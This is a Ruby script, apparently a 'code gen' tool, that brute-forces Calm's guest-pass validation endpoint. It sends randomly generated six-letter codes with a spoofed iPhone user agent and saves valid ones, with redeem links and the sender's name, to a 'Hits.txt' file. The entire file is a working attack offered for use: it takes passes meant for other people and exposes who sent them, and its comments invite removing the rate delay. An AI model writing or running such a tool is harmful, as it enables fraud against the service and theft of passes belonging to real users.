require 'colorize'
require 'json'
require 'net/http'
require 'uri'

puts "

░█████╗░░█████╗░██╗░░░░░███╗░░░███╗
██╔══██╗██╔══██╗██║░░░░░████╗░████║
██║░░╚═╝███████║██║░░░░░██╔████╔██║
██║░░██╗██╔══██║██║░░░░░██║╚██╔╝██║
╚█████╔╝██║░░██║███████╗██║░╚═╝░██║
░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝
Welcome To calm guest 30days code gen.

"

def gen
  m = (0...6).map { ('a'..'z').to_a[rand(26)] }.join
  head = {
    "User-Agent" => "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Accept" => "application/json, text/plain, */*",
    "Content-Type" => "application/json",
  }
  payload = {"code" => m}
  uri = URI.parse("https://www.calm.com/api/guest-pass/validate")
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  request = Net::HTTP::Post.new(uri.request_uri, head)
  request.body = payload.to_json
  response = http.request(request)
  if response.body.include? "error"
    puts "[Invalid]|#{m}".red
  else
    puts "[Valid]|#{m}|Sender: #{JSON.parse(response.body)["sender_name"]}|Redeem: https://www.calm.com/gp/#{m}|Enjoy!".green
    File.open("Hits.txt", "a") { |f| f.write("https://www.calm.com/gp/#{m}\n") }
  end
end

def main(amount)
  amount.times do
    begin
      gen
      sleep(0.3) # disable this line if you dont wanna deley chks
    rescue
    end
  end
  puts "FINISHED! Process done! Checked #{amount} Tasks".blue
end

if __FILE__ == $0
  print "Enter Number of Codes to Generate: "
  amount = gets.chomp.to_i
  main(amount)
end
